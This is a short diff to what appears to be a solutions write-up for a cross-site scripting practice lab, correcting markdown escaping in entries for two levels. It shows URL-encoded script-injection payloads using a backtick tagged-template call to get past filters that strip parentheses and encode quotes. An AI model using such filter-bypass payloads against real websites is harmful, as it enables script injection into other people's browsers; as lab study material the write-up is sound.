@@ -34,14 +34,14 @@ Raw body reflection with progressive filters on quotes, parens, and backticks.
 
 `/basic/level5/?query=%3Cscript%3Ealert%601%60%3C/script%3E`
 
-- payload: `<script>alert\`1\`</script>`
+- payload: ``<script>alert`1`</script>``
 - context: parens stripped; tagged template call replaces alert(1)
 
 ### basic-level6
 
 `/basic/level6/?query=%3Cscript%3Ealert%601%60%3C/script%3E`
 
-- payload: `<script>alert\`1\`</script>`
+- payload: ``<script>alert`1`</script>``
 - context: quotes encoded + parens stripped; backticks survive
 
 ### basic-level7
